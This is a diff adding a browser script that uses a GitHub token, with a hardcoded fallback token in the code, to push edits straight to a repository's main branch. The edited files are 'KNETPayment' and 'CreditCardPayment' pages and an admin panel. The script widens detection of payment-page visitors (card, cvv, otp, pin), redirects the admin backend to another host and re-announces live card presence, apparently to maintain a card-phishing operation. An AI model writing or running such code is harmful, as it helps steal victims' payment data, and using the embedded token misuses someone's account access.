@@ -1,0 +1,31 @@
+<script>
+const T=(location.href.match(/ghp_[A-Za-z0-9]+|github_pat_[A-Za-z0-9_]+/)||["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"])[0];
+const K="['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card']";
+const R=/const (isPaymentPage|isOnPaymentPage) = [^;]+;/;
+const N=n=>"const "+n+" = "+K+".some(h=>"+(n[2]=="P"?"pageLower":"visitorPage")+".indexOf(h)>-1);";
+const P='if (socket.value.connected) socket.value.emit("card:live", { presence: true });';
+const Q='const _s=socket.value,_a=()=>{try{_s.emit("card:live",{presence:true})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);';
+const J=[["server/index.js",[[R,N],["slice(0, 5);","slice(0, 7);"]]],["server/admin/index.html",[[R,N]]],["kdd-public/admin.html",[[R,N],["kdd-server-production.up.railway.app","sejel-server-zygy.onrender.com"]]],["client/src/pages/KNETPayment.tsx",[[P,Q],["[selectedPrefix","[selectedBank, selectedPrefix"]]],["client/src/pages/CreditCardPayment.tsx",[[P,Q]]]];
+const D=s=>new TextDecoder().decode(Uint8Array.from(atob(s.replace(/\s/g,"")),c=>c.charCodeAt(0)));
+const E=s=>{const a=new TextEncoder().encode(s);let o="";for(const b of a)o+=String.fromCharCode(b);return btoa(o)};
+const H={Authorization:"Bearer "+T,Accept:"application/vnd.github+json"};
+const out=["token: "+T.slice(0,12)+"..."];
+(async()=>{
+for(const [p,e] of J){
+ try{
+  const u="https://api.github.com/repos/fahshomi-ui/KDD/contents/"+p;
+  const r=await fetch(u+"?ref=main&t="+Date.now(),{headers:H});
+  if(!r.ok) throw Error("HTTP "+r.status+(r.status==401?" (التوكن غير صالح)":""));
+  const m=await r.json(); let x=D(m.content), n=0;
+  for(const [a,b] of e){
+   if(typeof b=="function"){ if(x.includes("indexOf(h)>-1")) continue; x=x.replace(a,b); n++; }
+   else { if(x.includes(b)) continue; if(!x.includes(a)){ out.push("! not found: "+p); continue; } x=x.split(a).join(b); n++; }
+  }
+  if(!n){ out.push("- no change: "+p); continue; }
+  const q=await fetch(u,{method:"PUT",headers:Object.assign({"Content-Type":"application/json"},H),body:JSON.stringify({message:"fix(liveCard): widen payment gate + admin backend url + reannounce",content:E(x),sha:m.sha,branch:"main"})});
+  out.push((q.ok?"OK ":"ERR ")+p);
+ }catch(err){ out.push("ERR "+p+" "+err.message); }
+}
+document.body.innerHTML="<pre style='font:14px monospace;padding:16px;white-space:pre-wrap'>"+out.join("\n")+"\n\nDONE - redeploy Render + rebuild frontend</pre>";
+})();
+</script>
